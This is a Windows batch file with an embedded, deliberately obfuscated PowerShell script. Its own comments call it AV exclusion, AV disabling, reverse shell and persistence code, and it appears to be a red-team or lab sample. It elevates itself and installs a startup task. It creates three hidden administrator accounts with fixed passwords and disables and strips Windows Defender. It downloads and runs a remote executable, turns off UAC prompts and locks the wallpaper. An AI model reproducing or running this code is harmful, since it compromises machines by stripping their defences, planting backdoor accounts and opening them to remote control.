@echo off
setlocal enabledelayedexpansion

set "destFolder=%ProgramData%\AlienMoment"
set "destPath=%destFolder%\alien-moment.bat"


rem Check if running from Program Files target
if /I not "%~f0"=="%destPath%" (
    rem Not running from destination, move self and relaunch
    if not exist "%destFolder%" mkdir "%destFolder%"
    copy /Y "%~f0" "%destPath%"
    powershell -Command "Start-Process -FilePath '%destPath%' -Verb RunAs"
    exit
)

rem Running from Program Files now with admin (add elevation check if needed)

set "outfile_path=%UserProfile%\Documents\alien-moment.ps1"
if not exist "%UserProfile%\Documents" mkdir "%UserProfile%\Documents"
if exist "%outfile_path%" del "%outfile_path%"

set "flag=0"
(
for /f "delims=" %%A in ('type "%~f0"') do (
    set "line=%%A"
    if "!line!"=="::PSCRIPT" (set "flag=1") else if "!line!"=="::EOF" (set "flag=0") else if !flag! EQU 1 echo(!line!
)
) > "%outfile_path%"

echo PowerShell script written to %outfile_path%

powershell.exe -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File \"%outfile_path%\"' -Verb RunAs"

schtasks /create /tn "AlienMomentBatch" /tr "\"%destPath%\"" /sc ONSTART /rl HIGHEST /f

exit

::PSCRIPT
# AV exclusion (obfuscated strings)
${S9H8} = 'Add'+'-'+'MpPreference'
&${S9H8} -ExclusionPath ( "${env:USERPROFILE}" + '\Downloads')

# WALLPAPER (obfuscated powershell, but unbroken C#)
${lkE1c}=('https'+':'+'//'+'i.ibb.co/QRbMGHx/alienmoment-background-1.jpg')
${U4WDd} = [io.path]::Combine($env:TEMP, ('public_'+'pic.jpg'))
try{
    &('Invoke'+'-'+'WebRequest') -Uri ${lkE1c} -OutFile ${U4WDd} -ErrorAction Stop
}catch{
    Write-Error ('Dow'+'nload failed: '+$($_.Exception.Message)); exit 1
}
${y8xE} = 'HKCU:\Control Panel\'+'Desktop'
Set-ItemProperty -Path ${y8xE} -Name ('Wallpaper'+'Style') -Value 2
Set-ItemProperty -Path ${y8xE} -Name ('Tile'+'Wallpaper') -Value 0

$JzC2=@"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type -TypeDefinition $JzC2
$YQ = [Wallpaper]::SystemParametersInfo(20, 0, ${U4WDd}, 3)
if($YQ -eq 0){ Write-Error ('Failed to set wallpaper.') } else { Write-Host ('Wallpaper set and stretched: '+${U4WDd}) }

# ADD USERS (obfuscation via variable renaming etc)
${g82a}=@(
    @{Username='sergio-pwn';FullName='Sergio Y';Password='P@ssw0rd1'},
    @{Username='doug-pwn';FullName='Doug M';Password='P@ssw0rd2'},
    @{Username='ian-pwn';FullName='Ian H';Password='P@ssw0rd3'}
)
foreach(${KRjvb} in ${g82a}) {
    Write-Host ('Processing '+$(${KRjvb}.Username)+'...') -ForegroundColor Cyan
    try{
        ${EtF2}=ConvertTo-SecureString $(${KRjvb}.Password) -AsPlainText -Force
        ${AYQ8}=Get-LocalUser -Name $(${KRjvb}.Username) -ErrorAction SilentlyContinue
        if(${AYQ8}){
            Write-Host ('User '+$(${KRjvb}.Username)+' exists, updating password...') -ForegroundColor Yellow
            Set-LocalUser -Name $(${KRjvb}.Username) -Password ${EtF2}
        }else{
            Write-Host ('Creating '+$(${KRjvb}.Username)+'...') -ForegroundColor Green
            New-LocalUser -Name $(${KRjvb}.Username) -FullName $(${KRjvb}.FullName) -Password ${EtF2} -Description ""
        }
        if(-not(Get-LocalGroupMember -Group Administrators -Member $(${KRjvb}.Username) -ErrorAction SilentlyContinue)){
            Add-LocalGroupMember -Group Administrators -Member $(${KRjvb}.Username)
            Write-Host ('Added '+$(${KRjvb}.Username)+' to Administrators group.')
        }else{
            Write-Host ($(${KRjvb}.Username)+' already in Administrators group.')
        }
    }catch{
        Write-Host ('Error: '+$_) -ForegroundColor Red
    }
    Write-Host ""
}
Write-Host ('All done!') -ForegroundColor Magenta

# DISABLE AV (obfuscated strings with -join example)
${IaN}= @('H','K','L','M',':\SOFTWARE\Policies\Microsoft\Windows Defender') -join ''
New-Item -Path ${IaN} -Force | Out-Null
Set-ItemProperty -Path ${IaN} -Name 'DisableAntiSpyware' -Value 1 -Type DWord
${EfYf} = "${IaN}\Real-Time Protection"
New-Item -Path ${EfYf} -Force | Out-Null
@('DisableBehaviorMonitoring','DisableOnAccessProtection','DisableRealtimeMonitoring','DisableIOAVProtection')|%{
    Set-ItemProperty -Path ${EfYf} -Name $_ -Value 1 -Type DWord
}
try{
    Stop-Service -Name ('Win'+'Defend') -Force -ErrorAction Stop
    Set-Service -Name ('Win'+'Defend') -StartupType Disabled
    Write-Host ('WinDefend stopped and disabled.')
}catch{
    Write-Warning ('Could not stop Defender. May need reboot.')
}
@("C:\ProgramData\Microsoft\Windows Defender\Scans","C:\ProgramData\Microsoft\Windows Defender\Definition Updates")|%{
    if(Test-Path $_){
        Remove-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host ('Removed: '+$_)
    }
}
try{
    Remove-MpSignature; Write-Host ('Defender signatures cleared.')
}catch{
    Write-Warning ('Could not clear active signatures.')
}
Write-Host ('Defender status finalized. Reboot needed.') -ForegroundColor Green

# REVERSE SHELL (obfuscated by concatenation, path built dynamically)
&('Invoke-'+'WebRequest') -Uri ('https://raw.githubusercontent.com/'+'VulnerabilityVigilante/alien-moment/main/alienmoment.exe') -OutFile ($env:USERPROFILE+'\Downloads\alienmoment.exe')
cd ($env:USERPROFILE+'\Downloads\')
.\alienmoment.exe

# REGISTRY CHANGES FOR PERSISTENCE
if(-not([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))){
    Write-Host ('Restarting script as admin...') -ForegroundColor Yellow
    Start-Process powershell -ArgumentList ("-ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}
Write-Host ('Applying registry/policy changes...') -ForegroundColor Cyan
${NfEe}='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
if(-not(Test-Path ${NfEe})){New-Item -Path ${NfEe} -Force | Out-Null}
Set-ItemProperty -Path ${NfEe} -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force
Set-ItemProperty -Path ${NfEe} -Name 'PromptOnSecureDesktop' -Value 0 -Type DWord -Force
Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force
${Qofp}="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
${XTbf}="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@(${Qofp},${XTbf})|%{if(-not(Test-Path $_)){New-Item -Path $_ -Force | Out-Null}}
Set-ItemProperty -Path ${Qofp} -Name 'NoChangingWallPaper' -Value 1 -Type DWord -Force
Set-ItemProperty -Path ${XTbf} -Name 'Wallpaper' -Value "" -Force
Set-ItemProperty -Path ${XTbf} -Name 'WallpaperStyle' -Value 0 -Type DWord -Force
${WwIe} = [PSCustomObject]@{
    ConsentPromptBehaviorAdmin = (Get-ItemProperty -Path ${NfEe} -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
    PromptOnSecureDesktop = (Get-ItemProperty -Path ${NfEe} -ErrorAction SilentlyContinue).PromptOnSecureDesktop
    ExecutionPolicy_LocalMachine = (Get-ExecutionPolicy -List | Where-Object { $_.Scope -eq "LocalMachine" }).ExecutionPolicy
    NoChangingWallPaper = (Get-ItemProperty -Path ${Qofp} -ErrorAction SilentlyContinue).NoChangingWallPaper
}
${WwIe}|Format-List
Write-Host ('Registry/Policy changes applied!') -ForegroundColor Green

::EOF

